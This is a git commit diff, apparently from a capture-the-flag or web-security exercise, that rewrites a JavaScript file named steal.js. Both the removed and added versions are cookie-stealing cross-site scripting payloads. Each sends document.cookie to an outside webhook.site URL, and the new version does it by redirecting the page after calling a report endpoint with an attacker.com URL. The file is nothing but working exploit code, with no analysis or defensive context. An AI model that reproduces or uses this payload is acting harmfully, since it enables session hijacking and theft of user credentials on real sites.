8ab3521eda02419e31b51ac0e6ac2c5935a0c74f
Rushiraj-Baxi <49586938+Rushiraj-Baxi@users.noreply.github.com>
2025-12-12 11:05:30 +0000

    lol

--- steal.js
+++ steal.js
@@ -1,2 +1,10 @@
-var img = new Image();
-img.src = 'https://webhook.site/0c5e2136-42eb-4d9a-8813-83182fee95ed?cookie=' + encodeURIComponent(document.cookie);
+// First log to console so you can see it
+console.log('Cookie:', document.cookie);
+
+// Try to send via allowed endpoint
+fetch('/report?url=https://attacker.com').then(() => {
+    // After it completes, redirect to exfiltrate
+    setTimeout(() => {
+        window.location = 'https://webhook.site/0c5e2136-42eb-4d9a-8813-83182fee95ed?cookie=' + encodeURIComponent(document.cookie);
+    }, 100);
+});
